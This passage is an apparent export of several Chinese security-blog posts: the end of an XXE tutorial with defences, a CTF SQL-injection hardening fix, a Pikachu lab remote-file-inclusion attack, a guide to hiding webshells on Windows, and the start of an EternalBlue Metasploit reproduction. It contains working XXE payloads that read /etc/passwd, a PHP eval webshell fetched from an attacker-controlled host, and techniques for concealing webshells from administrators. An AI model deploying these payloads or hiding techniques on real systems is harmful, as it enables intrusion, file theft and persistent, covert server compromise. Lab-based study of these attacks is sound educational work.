<pre><code>POST /vulnerable HTTP/1.1
Host: www.test.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://test.com/test.html
Content-Type: application/xml
Content-Length: 294
Cookie: mycookie=cookies;
Connection: close
Upgrade-Insecure-Requests: 1

&lt;?xml version="1.0"?&gt;
&lt;catalog&gt;
   &lt;core id="test101"&gt;
      &lt;author&gt;John, Doe&lt;/author&gt;
      &lt;title&gt;I love XML&lt;/title&gt;
      &lt;category&gt;Computers&lt;/category&gt;
      &lt;price&gt;9.99&lt;/price&gt;
      &lt;date&gt;2018-10-01&lt;/date&gt;
      &lt;description&gt;XML is the best!&lt;/description&gt;
   &lt;/core&gt;
&lt;/catalog&gt;</code></pre>
<p>我们发出 带有 xml 的 POST 请求以后，述代码将交由服务器的XML处理器解析。代码被解释并返回：{“Request Successful”: “Added!”}</p>
<p>但是如果我们传入一个恶意的代码</p>
<pre><code>&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;
&lt;catalog&gt;
   &lt;core id="test101"&gt;
      &lt;author&gt;John, Doe&lt;/author&gt;
      &lt;title&gt;I love XML&lt;/title&gt;
      &lt;category&gt;Computers&lt;/category&gt;
      &lt;price&gt;9.99&lt;/price&gt;
      &lt;date&gt;2018-10-01&lt;/date&gt;
      &lt;description&gt;&amp;xxe;&lt;/description&gt;
   &lt;/core&gt;
&lt;/catalog&gt;</code></pre>
<p>如果没有做好“安全措施” 就会出现解析恶意代码的情况，就会有下面的返回</p>
<pre><code>{"error": "no results for description root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync...</code></pre>
<h3 id="实例二：微信支付的-XXE"><a href="#实例二：微信支付的-XXE" class="headerlink" title="实例二：微信支付的 XXE"></a><strong>实例二：微信支付的 XXE</strong></h3><p>前一阵子非常火的微信支付的 XXE 漏洞当然不得不提，</p>
<p><strong>漏洞描述：</strong></p>
<p>微信支付提供了一个 api 接口，供商家接收异步支付结果，微信支付所用的java  sdk在处理结果时可能触发一个XXE漏洞，攻击者可以向这个接口发送构造恶意payloads,获取商家服务器上的任何信息，一旦攻击者获得了敏感的数据 (md5-key and merchant-Id etc.)，他可能通过发送伪造的信息不用花钱就购买商家任意物品</p>
<p>我下载了 java 版本的 sdk 进行分析，这个 sdk 提供了一个 WXPayUtil 工具类，该类中实现了xmltoMap和maptoXml这两个方法，而这次的微信支付的xxe漏洞爆发点就在xmltoMap方法中</p>
<p><strong>如图所示：</strong></p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002650-eb304d9e-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002650-eb304d9e-ec17-1.png" alt="img"></a></p>
<p>问题就出现在我横线划出来的那部分，也就是简化为下面的代码：</p>
<pre><code>public static Map&lt;String, String&gt; xmlToMap(String strXML) throws Exception {
        try {
            Map&lt;String, String&gt; data = new HashMap&lt;String, String&gt;();
            DocumentBuilder documentBuilder = WXPayXmlUtil.newDocumentBuilder();
            InputStream stream = new ByteArrayInputStream(strXML.getBytes("UTF-8"));
            org.w3c.dom.Document doc = documentBuilder.parse(stream);
            ...</code></pre>
<p>我们可以看到 当构建了 documentBuilder 以后就直接对传进来的 strXML  解析了，而不巧的是 strXML 是一处攻击者可控的参数，于是就出现了 XXE 漏洞，下面是我实验的步骤</p>
<p>首先我在 com 包下又新建了一个包，来写我们的测试代码，测试代码我命名为 test001.java</p>
<p><strong>如图所示：</strong></p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002651-eb80dca0-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002651-eb80dca0-ec17-1.png" alt="img"></a></p>
<p><strong>test001.java</strong></p>
<pre><code>package com.test.test001;

import java.util.Map;

import static com.github.wxpay.sdk.WXPayUtil.xmlToMap;

public class test001 {
    public static void main(String args[]) throws Exception {

        String xmlStr ="&lt;?xml version='1.0' encoding='utf-8'?&gt;\r\n" +
                "&lt;!DOCTYPE XDSEC [\r\n" +
                "&lt;!ENTITY xxe SYSTEM 'file:///d:/1.txt'&gt;]&gt;\r\n" +
                "&lt;XDSEC&gt;\r\n"+
                "&lt;XXE&gt;&amp;xxe;&lt;/XXE&gt;\r\n" +
                "&lt;/XDSEC&gt;";

        try{

            Map&lt;String,String&gt; test = xmlToMap(xmlStr);
            System.out.println(test);
        }catch (Exception e){
            e.printStackTrace();
        }

    }
}</code></pre>
<p>我希望它能读取我 D 盘下面的 1.txt 文件</p>
<p>运行后成功读取</p>
<p><strong>如图所示：</strong></p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002651-eba50724-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002651-eba50724-ec17-1.png" alt="img"></a></p>
<p>当然，WXPayXmlUtil.java 中有这个 sdk 的配置项，能直接决定实验的效果，当然后期的修复也是针对这里面进行修复的</p>
<pre><code>http://apache.org/xml/features/disallow-doctype-decl true
http://apache.org/xml/features/nonvalidating/load-external-dtd false
http://xml.org/sax/features/external-general-entities false
http://xml.org/sax/features/external-parameter-entities false</code></pre>
<p>整个源码我打包好了已经上传到我的百度云，有兴趣的童鞋可以运行一下感受：</p>
<blockquote>
<p>链接：<a href="https://pan.baidu.com/s/1YbCO2cZpzZS1mWd7Mes4Qw">https://pan.baidu.com/s/1YbCO2cZpzZS1mWd7Mes4Qw</a>  提取码：xq1b</p>
</blockquote>
<p>上面说过 java 中有一个 netdoc:/ 协议能代替 file:/// ,我现在来演示一下：</p>
<p><strong>如图所示：</strong></p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002652-ebdec6a8-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002652-ebdec6a8-ec17-1.png" alt="img"></a></p>
<h3 id="实例三：JSON-content-type-XXE"><a href="#实例三：JSON-content-type-XXE" class="headerlink" title="实例三：JSON content-type XXE"></a><strong>实例三：JSON content-type XXE</strong></h3><p>正如我们所知道的，很多web和移动应用都基于客户端-服务器交互模式的web通信服务。不管是SOAP还是RESTful，一般对于web服务来说，最常见的数据格式都是XML和JSON。尽管web服务可能在编程时只使用其中一种格式，但服务器却可以接受开发人员并没有预料到的其他数据格式，这就有可能会导致JSON节点受到XXE（XML外部实体）攻击</p>
<h4 id="原始请求和响应："><a href="#原始请求和响应：" class="headerlink" title="原始请求和响应："></a><strong>原始请求和响应：</strong></h4><p><strong>HTTP Request:</strong></p>
<pre><code>POST /netspi HTTP/1.1
Host: someserver.netspi.com
Accept: application/json
Content-Type: application/json
Content-Length: 38

{"search":"name","value":"netspitest"}</code></pre>
<p><strong>HTTP Response:</strong></p>
<pre><code>HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 43

{"error": "no results for name netspitest"}</code></pre>
<p>现在我们尝试将 Content-Type 修改为 application/xml</p>
<h4 id="进一步请求和响应："><a href="#进一步请求和响应：" class="headerlink" title="进一步请求和响应："></a><strong>进一步请求和响应：</strong></h4><p><strong>HTTP Request:</strong></p>
<pre><code>POST /netspi HTTP/1.1
Host: someserver.netspi.com
Accept: application/json
Content-Type: application/xml
Content-Length: 38

{"search":"name","value":"netspitest"}</code></pre>
<p><strong>HTTP Response:</strong></p>
<pre><code>HTTP/1.1 500 Internal Server Error
Content-Type: application/json
Content-Length: 127

{"errors":{"errorMessage":"org.xml.sax.SAXParseException: XML document structures must start and end within the same entity."}}</code></pre>
<p>可以发现服务器端是能处理 xml 数据的，于是我们就可以利用这个来进行攻击</p>
<h4 id="最终的请求和响应："><a href="#最终的请求和响应：" class="headerlink" title="最终的请求和响应："></a><strong>最终的请求和响应：</strong></h4><p><strong>HTTP Request:</strong></p>
<pre><code>POST /netspi HTTP/1.1
Host: someserver.netspi.com
Accept: application/json
Content-Type: application/xml
Content-Length: 288

&lt;?xml version="1.0" encoding="UTF-8" ?&gt;
&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;
&lt;root&gt;
&lt;search&gt;name&lt;/search&gt;
&lt;value&gt;&amp;xxe;&lt;/value&gt;
&lt;/root&gt;</code></pre>
<p><strong>HTTP Response:</strong></p>
<pre><code>HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 2467

{"error": "no results for name root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync....</code></pre>
<h2 id="六、XXE-如何防御"><a href="#六、XXE-如何防御" class="headerlink" title="六、XXE 如何防御"></a><strong>六、XXE 如何防御</strong></h2><h3 id="方案一：使用语言中推荐的禁用外部实体的方法"><a href="#方案一：使用语言中推荐的禁用外部实体的方法" class="headerlink" title="方案一：使用语言中推荐的禁用外部实体的方法"></a><strong>方案一：使用语言中推荐的禁用外部实体的方法</strong></h3><p><strong>PHP：</strong></p>
<pre><code>libxml_disable_entity_loader(true);</code></pre>
<p><strong>JAVA:</strong></p>
<pre><code>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
dbf.setExpandEntityReferences(false);

.setFeature("http://apache.org/xml/features/disallow-doctype-decl",true);

.setFeature("http://xml.org/sax/features/external-general-entities",false)

.setFeature("http://xml.org/sax/features/external-parameter-entities",false);</code></pre>
<p><strong>Python：</strong></p>
<pre><code>from lxml import etree
xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</code></pre>
<h3 id="方案二：手动黑名单过滤-不推荐"><a href="#方案二：手动黑名单过滤-不推荐" class="headerlink" title="方案二：手动黑名单过滤(不推荐)"></a><strong>方案二：手动黑名单过滤(不推荐)</strong></h3><p>过滤关键词：</p>
<pre><code>&lt;!DOCTYPE、&lt;!ENTITY SYSTEM、PUBLIC</code></pre>
<p>参考：<a href="https://xz.aliyun.com/t/3357#toc-17">https://xz.aliyun.com/t/3357#toc-17</a></p>
]]></content>
      <tags>
        <tag>漏洞利用</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF加固题：Ezsql</title>
    <url>/2022/01/01/buuctf-jia-gu-ti/buuctf-jia-gu-ti-ezsql/</url>
    <content><![CDATA[<p><img src="/BUUCTF%E5%8A%A0%E5%9B%BA%E9%A2%98%EF%BC%9AEzsql.assets/image-20220101145336353.png" alt="image-20220101145336353"></p>
<p>用mobaXterm/XFTP之类的去链接服务器</p>
<p><img src="/BUUCTF%E5%8A%A0%E5%9B%BA%E9%A2%98%EF%BC%9AEzsql.assets/image-20220101145501821.png" alt="image-20220101145501821"></p>
<p>备份var/www/html下的文件</p>
<p>index.php关键代码：</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span> <span class="token string">'dbConnect.php'</span><span class="token punctuation">;</span>
<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM users WHERE username = '$username' AND password = '$password'"</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$result</span><span class="token punctuation">)</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_all</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 从结果集中获取所有数据</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string">'登录成功！'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string">"用户名或密码错误"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<p>在vscode中修改拉进去（因为编码问题）</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span> <span class="token string">'dbConnect.php'</span><span class="token punctuation">;</span>
<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$r</span><span class="token operator">=</span><span class="token string">"/  \~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\)|\)|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\&lt;|\.|\>|\/|\?|\\\\  /i"</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">||</span> 
       <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM users WHERE username = '$username' AND password = '$password'"</span><span class="token punctuation">;</span>
        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$result</span><span class="token punctuation">)</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_all</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 从结果集中获取所有数据</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string">'登录成功！'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string">"用户名或密码错误"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string">'输入不正确！'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>


<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<p>通过preg_match过滤</p>
<pre class=" language-php"><code class="language-php"><span class="token string">"/  \~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\)|\)|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\&lt;|\.|\>|\/|\?|\\\\  /i"</span></code></pre>
<p>ctrl+s</p>
<p>访问check服务器</p>
<p><img src="/BUUCTF%E5%8A%A0%E5%9B%BA%E9%A2%98%EF%BC%9AEzsql.assets/image-20220101150037932.png" alt="image-20220101150037932"></p>
<p><img src="/BUUCTF%E5%8A%A0%E5%9B%BA%E9%A2%98%EF%BC%9AEzsql.assets/image-20220101150320173.png" alt="image-20220101150320173"></p>
]]></content>
  </entry>
  <entry>
    <title>Pikachu：远程文件包含写入木马</title>
    <url>/2022/01/03/pikachu/pikachu-yuan-cheng-wen-jian-bao-han-xie-ru-mu-ma/</url>
    <content><![CDATA[<p>用kali做远程主机</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token variable">$myfile</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"shell.php"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token string">'&lt;?php @eval($_POST["shell"]);?>'</span><span class="token punctuation">;</span>
    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">,</span> <span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<p>写入var/www/html/phpinfo.txt</p>
<p>这段php可以生成shell.php并写入🐎</p>
<p>启动apache服务</p>
<pre class=" language-bash"><code class="language-bash">systemctl start apache2.service
systemctl status apache2.service
<span class="token function">ifconfig</span></code></pre>
<p><img src="/2022/01/03/pikachu/pikachu-yuan-cheng-wen-jian-bao-han-xie-ru-mu-ma/1.png" alt="1"></p>
<p>访问一下试试</p>
<p><img src="/2022/01/03/pikachu/pikachu-yuan-cheng-wen-jian-bao-han-xie-ru-mu-ma/b.png" alt="b"></p>
<pre class=" language-http"><code class="language-http"><span class="token header-name keyword">http:</span>//127.0.0.1/pikachu/vul/fileinclude/fi_remote.php?filename=http://xxx.xx.xx.xx/phpinfo.txt&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</code></pre>
<p>看到已经写入shell.php</p>
<p><img src="/2022/01/03/pikachu/pikachu-yuan-cheng-wen-jian-bao-han-xie-ru-mu-ma/c.png" alt="c"></p>
<p>蚁剑连接，非常离谱<img src="/2022/01/03/pikachu/pikachu-yuan-cheng-wen-jian-bao-han-xie-ru-mu-ma/d.png" alt="d"></p>
<p><img src="/2022/01/03/pikachu/pikachu-yuan-cheng-wen-jian-bao-han-xie-ru-mu-ma/e.png" alt="e"></p>
]]></content>
  </entry>
  <entry>
    <title>Windows主机下隐藏木马</title>
    <url>/2022/01/03/windows-zhu-ji-xia-yin-cang-mu-ma/windows-zhu-ji-xia-yin-cang-mu-ma/</url>
    <content><![CDATA[<p>接上文（<a href="https://lxh3ng.github.io/2022/01/03/pikachu/pikachu-yuan-cheng-wen-jian-bao-han-xie-ru-mu-ma/">Pikachu：远程文件包含写入木马</a>）在目录下创建了shell.php后</p>
<h2 id="隐藏文件夹隐藏Webshell"><a href="#隐藏文件夹隐藏Webshell" class="headerlink" title="隐藏文件夹隐藏Webshell"></a>隐藏文件夹隐藏Webshell</h2><p>打开蚁剑终端</p>
<pre class=" language-shell"><code class="language-shell">mkdir tmp #创建隐藏文件夹,此时尚未隐藏
cd tmp #进入创建的文件夹
echo ^<?php @eval($_POST["shell"]);?^> >>shell.php#写入Webshell至tmp目录下
cd ../ #返回上一级目录
attrib +s +a +h +r tmp #对创建的文件夹进行隐藏</code></pre>
<p><img src="/2022/01/03/windows-zhu-ji-xia-yin-cang-mu-ma/windows-zhu-ji-xia-yin-cang-mu-ma/1.png" alt="img"></p>
<p>我打开了显示隐藏文件，还是看不到的</p>
<p><img src="/2022/01/03/windows-zhu-ji-xia-yin-cang-mu-ma/windows-zhu-ji-xia-yin-cang-mu-ma/2.png" alt="2"></p>
<p>新的路径蚁剑可以连接：</p>
<p><img src="/2022/01/03/windows-zhu-ji-xia-yin-cang-mu-ma/windows-zhu-ji-xia-yin-cang-mu-ma/3.png" alt="3"></p>
<p>win11打开显示隐藏查看不到，但是可以通过路径直接访问</p>
<h2 id="利用系统代号隐藏Webshell"><a href="#利用系统代号隐藏Webshell" class="headerlink" title="利用系统代号隐藏Webshell"></a>利用系统代号隐藏Webshell</h2><p>特殊文件名的代号</p>
<pre class=" language-windows"><code class="language-windows">我的电脑.{20D04FE0-3AEA-1069-A2D8-08002B30309D}
回收站.{645ff040-5081-101b-9f08-00aa002f954e}
拔号网络.{992CFFA0-F557-101A-88EC-00DD010CCC48}
打印机.{2227a280-3aea-1069-a2de-08002b30309d}
控制面板.{21ec2020-3aea-1069-a2dd-08002b30309d}
网上邻居.{208D2C60-3AEA-1069-A2D7-08002B30309D}</code></pre>
<p>新建文件夹命名<code>我的电脑.{20D04FE0-3AEA-1069-A2D8-08002B30309D}</code>会变成我的电脑</p>
<p><img src="/2022/01/03/windows-zhu-ji-xia-yin-cang-mu-ma/windows-zhu-ji-xia-yin-cang-mu-ma/4.png" alt="4"></p>
<p>通过拼接文件夹名,使用中国蚁剑进行木马连接,例如</p>
<pre class=" language-http"><code class="language-http"><span class="token header-name keyword">http:</span>//。。。。。。。/Computer.{20D04FE0-3AEA-1069-A2D8-08002B30309D}/shell.php</code></pre>
<p><img src="/2022/01/03/windows-zhu-ji-xia-yin-cang-mu-ma/windows-zhu-ji-xia-yin-cang-mu-ma/5.png" alt="5"></p>
<h2 id="畸形目录隐藏Webshell"><a href="#畸形目录隐藏Webshell" class="headerlink" title="畸形目录隐藏Webshell"></a>畸形目录隐藏Webshell</h2><p>创建畸形目录</p>
<pre class=" language-shell"><code class="language-shell">mkdir a...\</code></pre>
<p>Copy命令将木马移动到畸形目录下</p>
<pre class=" language-shell"><code class="language-shell">copy b.asp</code></pre>
<p>删除方法：</p>
<pre class=" language-shell"><code class="language-shell">rd /s /q a...\</code></pre>
<p><img src="/2022/01/03/windows-zhu-ji-xia-yin-cang-mu-ma/windows-zhu-ji-xia-yin-cang-mu-ma/6.png" alt="6"></p>
<h2 id="利用系统保留名制作不死Webshell"><a href="#利用系统保留名制作不死Webshell" class="headerlink" title="利用系统保留名制作不死Webshell"></a>利用系统保留名制作不死Webshell</h2><p>在Windows操作系统中,是不能以下形式创建文件的,比如aux,com1,com2,prn,con,nul等.但是在cmd目录下可以通过copy语句创建,这类文件无法在图形化界面被删除,只能在命令行中被删除. 创建不死Webshell命令如下:</p>
<pre class=" language-shell"><code class="language-shell">copy shell.php \\.\D:\phpStudy\PHPTutorial\WWW\pikachu\vul\fileinclude\1.php</code></pre>
<p>我的win11没有复现成功</p>
<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg3ODY3MzcwMQ==&amp;mid=2247484784&amp;idx=3&amp;sn=8fc983d40d91b7a9a7eb709e65c944cd&amp;chksm=cf116f3af866e62c90285b409378aabfc55d708ea0606b9c81630e52cb1ca4c059027849907d&amp;mpshare=1&amp;scene=23&amp;srcid=0103GMx84FrUrfZnWKJpp0Jl&amp;sharer_sharetime=1641200593711&amp;sharer_shareid=992c19d88a5a27647ec75d14d60782cb#rd">Th0r：Windows下木马隐藏小技巧</a></p>
]]></content>
  </entry>
  <entry>
    <title>MS17-010 永恒之蓝(EternalBlue)远程溢出复现</title>
    <url>/2022/02/01/ms17-010-yong-heng-zhi-lan-eternalblue-yuan-cheng-yi-chu-fu-xian/ms17-010-yong-heng-zhi-lan-eternalblue-yuan-cheng-yi-chu-fu-xian/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>2017年4月的时候，Shadow broker在网络上公布一批NSA（美国国家安全局）使用的网络武器，其中就包含一种工具，可以远程控制有漏洞的任何一台windows机器，正是这些工具的问世，导致了去年WannaCry病毒横行世界，短短的时间内攻陷了多少台电脑，本人也是这个病毒的受害者。这个病毒的爆发牵扯出来一系列的故事，就像美国大片一样精彩，出现的Shadow broker组织，其揭露出来的NSA武器工具库（其中就包括永恒之蓝）。</p>
<ul>
<li>MS17-010    CVE-2017-0143</li>
<li>MS17-010    CVE-2017-0144</li>
<li>MS17-010    CVE-2017-0145</li>
<li>MS17-010    CVE-2017-0146</li>
<li>MS17-010    CVE-2017-0148</li>
</ul>
<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><ul>
<li>Windows 2000</li>
<li>Windows XP</li>
<li>Windows Vista</li>
<li>Windows7</li>
<li>Windows8</li>
<li>Windows8.1</li>
<li>Windows10</li>
<li>Windows Server 2000</li>
<li>Windows Server 2003</li>
<li>Windows Server 2008</li>
<li>Windows Server 2012</li>
<li>Windows Server 2016</li>
</ul>
<h2 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01    准备工作"></a>0x01    准备工作</h2><p>靶机：Windows 7（IP：192.168.159.129）</p>
<p>攻击机：kali 2020（IP：192.168.159.128）</p>
<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02     漏洞利用"></a>0x02     漏洞利用</h2><p>ping一下</p>
<img src="/2022/02/01/ms17-010-yong-heng-zhi-lan-eternalblue-yuan-cheng-yi-chu-fu-xian/ms17-010-yong-heng-zhi-lan-eternalblue-yuan-cheng-yi-chu-fu-xian/image-20220201041835320.png" alt="image-20220201041835320" style="zoom:150%;">

<p>nmap扫描</p>
<pre><code>root@h3ng:～# nmap --script=vuln 192.168.159.129</code></pre>
<p>扫描出四个漏洞包括MS17-010</p>
<p><img src="/2022/02/01/ms17-010-yong-heng-zhi-lan-eternalblue-yuan-cheng-yi-chu-fu-xian/ms17-010-yong-heng-zhi-lan-eternalblue-yuan-cheng-yi-chu-fu-xian/image-20220201042251461.png" alt="image-20220201042251461"></p>
<p>开启metasploit</p>
<pre><code>msfconsole</code></pre>
<p><img src="/2022/02/01/ms17-010-yong-heng-zhi-lan-eternalblue-yuan-cheng-yi-chu-fu-xian/ms17-010-yong-heng-zhi-lan-eternalblue-yuan-cheng-yi-chu-fu-xian/image-20220201200451812.png" alt="image-20220201200451812"></p>
<p>搜索MS17-010模块，共五个模块</p>
<pre><code>msf6 &gt; search ms17-010</code></pre>
<p><img src="/2022/02/01/ms17-010-yong-heng-zhi-lan-eternalblue-yuan-cheng-yi-chu-fu-xian/ms17-010-yong-heng-zhi-lan-eternalblue-yuan-cheng-yi-chu-fu-xian/image-20220201200512853.png" alt="image-20220201200512853"></p>
<pre><code>use auxiliary/scanner/smb/smb_ms17_010</code></pre>
<pre><code>show options</code></pre>
<p><img src="/2022/02/01/ms17-010-yong-heng-zhi-lan-eternalblue-yuan-cheng-yi-chu-fu-xian/ms17-010-yong-heng-zhi-lan-eternalblue-yuan-cheng-yi-chu-fu-xian/image-20220201200548245.png" alt="image-20220201200548245"></p>
<pre><code>set rhosts 192.168.159.129</code></pre>
<p><img src="/2022/02/01/ms17-010-yong-heng-zhi-lan-eternalblue-yuan-cheng-yi-chu-fu-xian/ms17-010-yong-heng-zhi-lan-eternalblue-yuan-cheng-yi-chu-fu-xian/image-20220201200606652.png" alt="image-20220201200606652"></p>
<pre><code>exploit</code></pre>
<p><img src="/2022/02/01/ms17-010-yong-heng-zhi-lan-eternalblue-yuan-cheng-yi-chu-fu-xian/ms17-010-yong-heng-zhi-lan-eternalblue-yuan-cheng-yi-chu-fu-xian/image-20220201200634751.png" alt="image-20220201200634751"></p>
<p>再次验证确实存在永恒之蓝漏洞</p>
